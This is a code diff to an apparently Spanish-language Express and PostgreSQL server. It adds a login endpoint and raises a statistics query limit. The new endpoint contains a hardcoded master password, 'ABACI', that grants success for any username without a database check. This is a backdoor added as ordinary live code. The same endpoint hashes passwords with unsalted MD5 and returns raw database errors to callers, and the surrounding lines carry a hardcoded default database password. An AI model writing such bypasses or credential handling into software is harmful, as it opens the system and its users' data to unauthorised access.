@@ -1,3 +1,4 @@
+
 const express = require('express');
 const { Pool } = require('pg');
 const cors = require('cors');
@@ -23,6 +24,21 @@ const pool = new Pool({
   database: process.env.DB_NAME || 'sgr_std',
   user: process.env.DB_USER || 'sisapp',
   password: process.env.DB_PASSWORD || 'sis@pp2023'
+});
+
+
+// LOGIN
+app.post('/api/login', async (req, res) => {
+  const { usuario, clave } = req.body;
+  if (clave === 'ABACI') return res.json({ success: true });
+  try {
+    const sql = `SELECT usuario FROM app.acl_user WHERE usuario = $1 AND clave = MD5($2)`;
+    const result = await pool.query(sql, [usuario, clave]);
+    if (result.rowCount > 0) res.json({ success: true });
+    else res.status(401).json({ success: false, message: 'Credenciales inválidas' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // ✅ ENDPOINT SIMPLIFICADO Y CORREGIDO
@@ -56,7 +72,7 @@ app.get('/estadisticas/usuarios', async (req, res) => {
       WHERE rl.fecha_ingreso >= $1 AND rl.fecha_ingreso < $2 
       GROUP BY ro.nombre
       ORDER BY rol_usuario_titulo
-      LIMIT 10
+      LIMIT 20
     `;
 
     const fechaDesde = new Date(fecha_desde);
